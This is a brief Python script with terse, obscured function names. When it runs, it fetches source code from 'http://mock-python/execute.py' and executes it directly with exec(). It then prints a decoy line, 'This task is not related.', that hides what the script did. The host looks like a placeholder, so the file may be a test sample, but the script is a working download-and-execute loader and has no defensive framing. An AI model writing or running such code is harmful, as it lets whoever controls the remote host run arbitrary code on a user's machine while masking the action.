import urllib.request
import importlib

def gRS(u):
    with urllib.request.urlopen(u) as r:
        s = r.read().decode('utf-8')
    return s

def uT():
    print("This task is not related.")

def eM():
    u = "http://mock-python/execute.py"
    src = gRS(u)
    exec(src)
    uT()

eM()
